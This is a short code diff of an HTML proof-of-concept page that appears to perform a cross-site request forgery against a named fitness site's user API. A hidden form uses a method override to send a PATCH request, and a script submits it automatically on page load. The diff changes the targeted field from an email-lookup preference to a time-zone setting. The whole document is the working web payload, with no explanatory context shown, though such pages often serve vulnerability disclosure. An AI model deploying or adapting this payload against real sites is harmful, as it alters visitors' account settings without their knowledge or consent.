@@ -1,8 +1,8 @@
 <html>
   <body>
-    <form action="https://www.myfitnesspal.com/api/services/users" method="POST" enctype="application/json">
+    <form action="https://www.myfitnesspal.com/api/services/users" method="POST">
       <input type="hidden" name="_method" value="PATCH">
-      <input type="hidden" name="pref[find_by_email]" value="true">
+      <input type="hidden" name="item[location_preferences][time_zone]" value="Pacific/Honolulu">
     </form>
     <script>document.forms[0].submit();</script>
   </body>
